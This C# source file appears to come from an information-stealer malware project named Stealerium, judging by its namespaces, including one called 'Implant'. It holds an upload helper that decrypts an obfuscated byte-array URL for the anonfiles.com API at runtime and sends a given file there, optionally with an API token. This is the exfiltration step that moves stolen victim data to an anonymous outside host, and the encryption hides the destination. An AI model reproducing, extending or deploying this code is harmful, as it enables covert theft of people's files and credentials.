using System;
using System.Net;
using System.Text;
using Stealerium.Modules.Implant;

namespace Stealerium.Helpers
{
    internal sealed class AnonFiles
    {
        public static string Upload(string file, bool api = false)
        {
            try
            {
                using (var client = new WebClient())
                {
                    // https://api.anonfiles.com/upload 
                    var response = client.UploadFile(
                        StringsCrypt.Decrypt(new byte[]
                        {
                            132, 159, 13, 215, 40, 84, 215, 209, 228, 91, 193, 62, 15, 132, 245, 223, 76, 214, 120, 117,
                            184, 126, 35, 6, 46, 117, 195, 158, 229, 64, 11, 213, 227, 93, 20, 154, 187, 127, 111, 188,
                            49, 126, 45, 1, 238, 146, 170, 78
                        }) +
                        (api ? StringsCrypt.AnonApiToken : ""), file);
                    var responseBody = Encoding.ASCII.GetString(response);
                    if (!responseBody.Contains("\"error\": {"))
                        return responseBody.Split('"')[15];
                    Console.WriteLine(responseBody);
                }
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
            }

            return null;
        }
    }
}